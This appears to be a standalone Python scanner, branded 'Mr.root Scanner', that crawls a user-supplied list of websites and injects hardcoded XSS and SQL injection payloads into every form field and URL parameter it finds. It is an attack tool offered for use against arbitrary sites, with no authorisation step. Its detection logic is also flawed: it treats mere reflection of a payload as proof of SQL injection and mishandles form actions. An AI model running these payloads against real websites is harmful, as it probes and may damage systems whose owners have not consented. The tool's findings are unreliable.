import requests
from bs4 import BeautifulSoup
import pyfiglet
from termcolor import colored
import os

# ASCII banner using pyfiglet
ascii_banner = pyfiglet.figlet_format("Mr.root Scanner")
print(colored(ascii_banner, "light_blue"))

# Common XSS payloads
xss_payloads = [
    "<script>alert(1)</script>",
    "'><script>alert(1)</script>",
    "\" onmouseover=alert(1) x=\"",
    "<img src=x onerror=alert(1)>",
    "'\"><svg/onload=alert(1)>"
]

# Common SQL Injection payloads
sql_payloads = [
    "' OR '1'='1",
    "\" OR \"1\"=\"1",
    "' UNION SELECT NULL, version()--",
    "\" UNION SELECT NULL, database()--",
    "' AND 1=1--",
    "' OR 'a'='a"
]

# Function to load websites from a file
def load_websites(file_name):
    if not os.path.exists(file_name):
        print(colored(f"File {file_name} not found!", "red"))
        return []
    with open(file_name, "r") as file:
        return [line.strip() for line in file if line.strip()]

# Discover all forms on a webpage
def discover_forms(url):
    try:
        response = requests.get(url, timeout=10)
        soup = BeautifulSoup(response.text, "html.parser")
        return soup.find_all("form")
    except requests.exceptions.RequestException as e:
        print(colored(f"[FORMS] Error discovering forms on {url}: {e}", "red"))
        return []

# Submit forms with payloads for testing
def test_form_xss_sql(url, forms, payloads):
    vulnerabilities = []
    for form in forms:
        action = form.get("action")
        method = form.get("method", "get").lower()
        inputs = form.find_all("input")
        
        # Prepare data for the form
        form_data = {}
        for input_tag in inputs:
            input_name = input_tag.get("name")
            if input_name:
                form_data[input_name] = payloads[0]  # Use first payload for now
        
        # Construct the form URL
        form_url = url if action.startswith("/") else url.rstrip("/") + "/" + action
        
        # Submit the form with payloads
        for payload in payloads:
            for key in form_data.keys():
                form_data[key] = payload
            try:
                if method == "post":
                    response = requests.post(form_url, data=form_data, timeout=10)
                else:
                    response = requests.get(form_url, params=form_data, timeout=10)
                
                if payload in response.text:
                    vulnerabilities.append({
                        "url": form_url,
                        "method": method.upper(),
                        "payload": payload,
                        "parameters": form_data
                    })
            except requests.exceptions.RequestException as e:
                print(colored(f"[FORM TEST] Error testing form on {form_url}: {e}", "red"))
    return vulnerabilities

# Test XSS and SQL Injection for query parameters in URLs
def test_url_parameters(url, payloads):
    vulnerabilities = []
    if "?" in url:
        base_url, params = url.split("?", 1)
        params = params.split("&")
        for payload in payloads:
            for param in params:
                key, value = param.split("=")
                modified_params = {key: (payload if key else value) for key, value in [p.split("=") for p in params]}
                try:
                    response = requests.get(base_url, params=modified_params, timeout=10)
                    if payload in response.text:
                        vulnerabilities.append({
                            "url": response.url,
                            "payload": payload,
                            "parameters": modified_params
                        })
                except requests.exceptions.RequestException as e:
                    print(colored(f"[URL TEST] Error testing parameters on {url}: {e}", "red"))
    return vulnerabilities

# Discover links within a website
def discover_links(url):
    links = []
    try:
        response = requests.get(url, timeout=10)
        soup = BeautifulSoup(response.text, "html.parser")
        for a_tag in soup.find_all("a", href=True):
            href = a_tag["href"]
            if href.startswith("http"):
                links.append(href)
            elif href.startswith("/"):
                links.append(url.rstrip("/") + href)
    except requests.exceptions.RequestException as e:
        print(colored(f"[DISCOVER] Error discovering links on {url}: {e}", "red"))
    return links

# Start scanning
def scan_websites(file_name):
    websites = load_websites(file_name)
    if not websites:
        return

    results = {}

    for website in websites:
        print(colored(f"\n[+] Scanning: {website}", "cyan"))

        # Discover additional links on the website
        links = discover_links(website)
        all_urls = [website] + links
        results[website] = {"xss": [], "sql": []}

        for url in all_urls:
            # Discover and test forms
            forms = discover_forms(url)
            xss_vulns_forms = test_form_xss_sql(url, forms, xss_payloads)
            sql_vulns_forms = test_form_xss_sql(url, forms, sql_payloads)

            # Test URL parameters
            xss_vulns_url = test_url_parameters(url, xss_payloads)
            sql_vulns_url = test_url_parameters(url, sql_payloads)

            # Combine all vulnerabilities
            results[website]["xss"].extend(xss_vulns_forms + xss_vulns_url)
            results[website]["sql"].extend(sql_vulns_forms + sql_vulns_url)

    # Display results
    for website, vulnerabilities in results.items():
        print(colored(f"\n[Results for {website}]:", "green"))

        # Display XSS vulnerabilities
        if vulnerabilities["xss"]:
            print(colored("XSS Vulnerabilities Found:", "yellow"))
            for vuln in vulnerabilities["xss"]:
                print(colored(f"Payload: {vuln['payload']} | URL: {vuln['url']} | Parameters: {vuln['parameters']}", "green"))
        else:
            print(colored("No XSS vulnerabilities found.", "red"))

        # Display SQL vulnerabilities
        if vulnerabilities["sql"]:
            print(colored("SQL Injection Vulnerabilities Found:", "yellow"))
            for vuln in vulnerabilities["sql"]:
                print(colored(f"Payload: {vuln['payload']} | URL: {vuln['url']} | Parameters: {vuln['parameters']}", "green"))
        else:
            print(colored("No SQL Injection vulnerabilities found.", "red"))

    print(colored("\n[+] Scan Complete!", "light_blue"))

# Main function
if __name__ == "__main__":
    print(colored("Enter the file name containing the list of websites (e.g., list.txt):", "yellow"))
    file_name = input("> ").strip()
    scan_websites(file_name)
